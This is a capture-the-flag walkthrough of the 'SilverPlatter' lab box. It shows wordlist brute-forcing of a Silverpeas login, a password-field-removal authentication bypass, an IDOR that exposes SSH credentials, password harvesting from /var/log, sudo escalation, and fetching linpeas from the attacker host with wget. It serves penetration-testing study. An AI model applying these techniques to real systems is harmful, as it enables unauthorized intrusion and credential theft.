# SilverPlatter

## Nmap Initial Scan

We can find the SSH port in port 22, HTTP web server at port 80, and an unknown service at port 8080 

- Nmap result
    
    ```python
    └─$ nmap -sC -sV silverplatter.thm
    Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 08:27 -0500
    Nmap scan report for silverplatter.thm (xx.xx.xxx.xx)
    Host is up (0.11s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 d8:a9:7a:2c:c1:94:d3:38:d3:b2:9f:69:0a:7d:c6:14 (ECDSA)
    |_  256 9e:39:f9:86:e6:7a:5d:fa:0b:be:30:f8:ed:31:f2:49 (ED25519)
    80/tcp   open  http       nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Hack Smarter Security
    8080/tcp open  http-proxy
    |_http-title: Error
    | fingerprint-strings: 
    |   FourOhFourRequest, HTTPOptions: 
    |     HTTP/1.1 404 Not Found
    |     Connection: close
    |     Content-Length: 74
    |     Content-Type: text/html
    |     Date: Mon, 22 Dec 2025 13:27:29 GMT
    |     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
    |   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Length: 0
    |     Connection: close
    |   GetRequest: 
    |     HTTP/1.1 404 Not Found
    |     Connection: close
    |     Content-Length: 74
    |     Content-Type: text/html
    |     Date: Mon, 22 Dec 2025 13:27:28 GMT
    |_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port8080-TCP:V=7.98%I=7%D=12/22%Time=6949473E%P=x86_64-pc-linux-gnu%r(G
    SF:etRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\
    SF:r\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,
    SF:\x2022\x20Dec\x202025\x2013:27:28\x20GMT\r\n\r\n<html><head><title>Erro
    SF:r</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOp
    SF:tions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nC
    SF:ontent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Mon,\x20
    SF:22\x20Dec\x202025\x2013:27:29\x20GMT\r\n\r\n<html><head><title>Error</t
    SF:itle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPReques
    SF:t,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nCon
    SF:nection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x2
    SF:0Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConte
    SF:nt-Type:\x20text/html\r\nDate:\x20Mon,\x2022\x20Dec\x202025\x2013:27:29
    SF:\x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x2
    SF:0Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20R
    SF:equest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gene
    SF:ricLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200
    SF:\r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x
    SF:20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(S
    SF:SLSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\
    SF:x200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/
    SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x2
    SF:0close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request
    SF:\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,4
    SF:2,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnec
    SF:tion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Re
    SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDSt
    SF:ring,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\n
    SF:Connection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20
    SF:Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n"
    SF:);
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 87.95 seconds
    
    ```
    

---

## HTTP Web Page (Port 80)

Below are pages that lies in the website

Main

Nothing special

![image.png](images/image.png)

**Intro**

![image.png](images/image%201.png)

**Work**

Nothing special

![The link will just redirect us back to the main page, which is negligible](images/image%202.png)

The link will just redirect us back to the main page, which is negligible

**About**

Nothing special

![image.png](images/image%203.png)

**Contact**

This is the part where it got interesting

![image.png](images/image%204.png)

- We now know there is a user called scr1ptkiddy
- There is a project called Silverpeas(https://www.silverpeas.org/), which is a Content Management System(CMS) for web pages.

---

## Silverpeas(Port 8080)

![image.png](images/image%205.png)

However, if you go to the endpoint  `/silverpeas`, we can see the Silverpeas login page

![image.png](images/image%206.png)

I don’t know the password, so I read the write-ups for this one. But apparently, there is a tool called `CeWL`(Custom Word List generator)) that will help us retrieve the words from the website and copy them to a `password.txt`

Using`cewl [http://silverplatter.thm](http://silverplatter.thm/) -w password.txt` , we can see that there are some words extracted

```bash
└─$ cat password.txt|head
the
Item
and
Security
Smarter
Hack
this
Default
adipiscing
you
```

We can then send the request to the intruder and try all possibilities, with the scr1ptkiddy account we have found earlier

![image.png](images/image%207.png)

Notice that `adipiscing` will result in a very long respond

![image.png](images/image%208.png)

Credentials: `scr1ptkiddy:adipiscing`

Using the above credentials, we can log in to Silverpeas.

![image.png](images/image%209.png)

---

### An Alternative way to Log In Silverpeas

This is a vulnerability(https://github.com/advisories/GHSA-4w54-wwc9-x62c) that allows users to log in without a password

![Just intercept with tools like Burpsuite, then remove the password field, and send the request](images/image%2010.png)

Just intercept with tools like Burpsuite, then remove the password field, and send the request

As you can see, we can still login

![image.png](images/image%2011.png)

---

### Actions after logging in to Silverpeas

We can then see we have an unread notification

![image.png](images/image%2012.png)

We can then view all of them in the site map → My notifications

![image.png](images/image%2013.png)

Is it vulnerable to IDOR!? Let’s see if we can change the ID. To do this, copy the link to a new tab, and change the ID

![image.png](images/image%2014.png)

After some attempts, I found that we can view ID=6 and see the ssh credentials under [`http://silverplatter.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6`](http://silverplatter.thm:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6)

![image.png](images/image%2015.png)

SSH credentials: `tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol` 

---

## SSH(Port 22)

```bash
└─$ ssh tim@silverplatter.thm
tim@silverplatter.thm's password: 
.
.
.
~$ ls
user.txt
~$ cat user.txt 
THM{c4ca4238a0b923820dcc509a6f75849b}
```

User Flag: `THM{c4ca4238a0b923820dcc509a6f75849b}`

---

## Privilege Escalation

```jsx
$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

Everything seems normal, but what is `adm`?

https://wiki.debian.org/SystemGroups#Other_System_Groups

> Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.
> 

I then used `find /var/log -type f -exec strings {} \;|grep -i 'password'` to find password:

I first found the hash of the user tyler

`_CMDLINE=useradd tyler --comment root --groups adm cdrom dip lxd plugdev sudo --password "\$6\$uJuA1kpnd4kTFniw\$/402iWwKzcYD8AMHG6bY/PXwZWOkrrVmtoO7qQpfvVLh1CHmiKUodwMGP7/awDYtrzpDHV8cNbpS1HJ6VMakN." --shell /bin/bash -m`

Then I also saw a password of his. Notice that `_Zd_zx7N823/` is the database password, but I guess it is worth a try

```jsx
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
Dec 13 16:17:31 silver-platter passwd[6811]: pam_unix(passwd:chauthtok): password changed for tim
Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
Dec 13 16:32:54 silver-platter passwd[7174]: pam_unix(passwd:chauthtok): password changed for tim
Dec 13 16:33:12 silver-platter sshd[7181]: Accepted password for tim from 192.168.1.20 port 50970 ssh2
Dec 13 16:35:45 silver-platter sshd[7297]: Accepted password for tyler from 192.168.1.20 port 58172 ssh2
Dec 13 16:45:33 silver-platter sshd[7622]: Accepted password for tyler from 192.168.1.20 port 33484 ssh2
Dec 13 17:43:09 silver-platter sshd[7750]: Accepted password for tyler from 192.168.1.20 port 45796 ssh2
Dec 13 17:51:30 silver-platter sshd[1370]: Accepted password for tyler from 192.168.1.20 port 60860 ssh2
Dec 13 17:51:41 silver-platter sshd[1681]: Accepted password for tyler from 192.168.1.20 port 55392 ssh2
```

Using `su tyler` and using the found password, we can found that we can login as tyler. 

```jsx
tyler@ip-xx-xx-xxx-xx:/home/tim$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
tyler@ip-xx-xx-xxx-xx:/home/tim$ sudo -l
Matching Defaults entries for tyler on ip-xx-xx-xxx-xx:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on ip-xx-xx-xxx-xx:
    (ALL : ALL) ALL

```

We can then see the flag under the root directory

```jsx
tyler@ip-xx-xx-xxx-xx:/home/tim$ sudo ls /root
[sudo] password for tyler: 
root.txt  snap  start_docker_containers.sh
tyler@ip-xx-xx-xxx-xx:/home/tim$ sudo cat /root/root.txt
THM{098f6bcd4621d373cade4e832627b4f6}
```

Root Flag: `THM{098f6bcd4621d373cade4e832627b4f6}`

---

## Automation using Linpeas

1. To install, use `wget [https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh)`
2. Set up an HTTP server using Python with `python3 -m http.server 80`, which will open in  port 80
3. Use wget to get the Linpeas script, `wget [http://<attack machine IP>:80/linpeas.sh](http://192.168.167.214/linpeas.sh)`(Notice that we don’t have permission in this case, so go to step 44)
4. Write in `/tmp` if no permission
    
    ```bash
    ~$ cd /tmp
    /tmp$ wget http://xxx.xxx.xxx.xxx:80/linpeas.sh
    --2025-12-24 03:29:12--  http://xxx.xxx.xxx.xxx/linpeas.sh
    Connecting to xxx.xxx.xxx.xxx:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 975444 (953K) [text/x-sh]
    Saving to: ‘linpeas.sh’
    
    linpeas.sh                                                 100%[======================================================================================================================================>] 952.58K  1.00MB/s    in 0.9s    
    
    2025-12-24 03:29:13 (1.00 MB/s) - ‘linpeas.sh’ saved [975444/975444]
    ```
    
5. `chmod +x [linpeas.sh](http://linpeas.sh)` to be able to run
6. Run the script, notice the highlighted and Red lines in the results

![image.png](images/image%2016.png)

1. Sadly, Linpeas cannot really help, as there is too much information, the best I can find of is the following:

![It is basically just the equivalence to the Privilege Escalation part](images/image%2017.png)

It is basically just the equivalence to the Privilege Escalation part

---

## Finished

![image.png](images/image%2018.png)

---

## Takeouts

- try using the password found in the system in other services, as password reuse is possible
- Be cautious of giving privileges
